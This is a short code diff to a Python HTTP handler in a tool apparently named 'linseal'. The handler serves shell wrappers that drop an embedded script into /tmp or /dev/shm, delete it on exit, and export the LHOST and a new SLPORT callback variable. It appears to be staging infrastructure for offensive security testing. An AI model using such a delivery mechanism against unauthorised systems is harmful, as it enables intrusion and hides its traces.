@@ -2623,10 +2623,12 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
             if parts:
                 args_line = " ".join(parts)
 
+        srv_port = _server.server_address[1] if _server else 2727
+
         if args_line:
-            wrapper = f'#!/bin/sh\n_LINSEAL_SELF=$(mktemp /tmp/linseal.XXXXXX 2>/dev/null || mktemp /dev/shm/linseal.XXXXXX)\ntrap "rm -f \\"$_LINSEAL_SELF\\"" EXIT\ncat > "$_LINSEAL_SELF" <<\'__LINSEAL_EOF__\'\n{script}\n__LINSEAL_EOF__\nchmod +x "$_LINSEAL_SELF"\nexport LHOST="{_lhost}"\n"$_LINSEAL_SELF" {args_line}\n'
+            wrapper = f'#!/bin/sh\n_LINSEAL_SELF=$(mktemp /tmp/linseal.XXXXXX 2>/dev/null || mktemp /dev/shm/linseal.XXXXXX)\ntrap "rm -f \\"$_LINSEAL_SELF\\"" EXIT\ncat > "$_LINSEAL_SELF" <<\'__LINSEAL_EOF__\'\n{script}\n__LINSEAL_EOF__\nchmod +x "$_LINSEAL_SELF"\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n"$_LINSEAL_SELF" {args_line}\n'
         else:
-            wrapper = f'#!/bin/sh\nexport LHOST="{_lhost}"\n' + script
+            wrapper = f'#!/bin/sh\nexport LHOST="{_lhost}"\nexport SLPORT="{srv_port}"\n' + script
 
         self._send_text(wrapper)
 
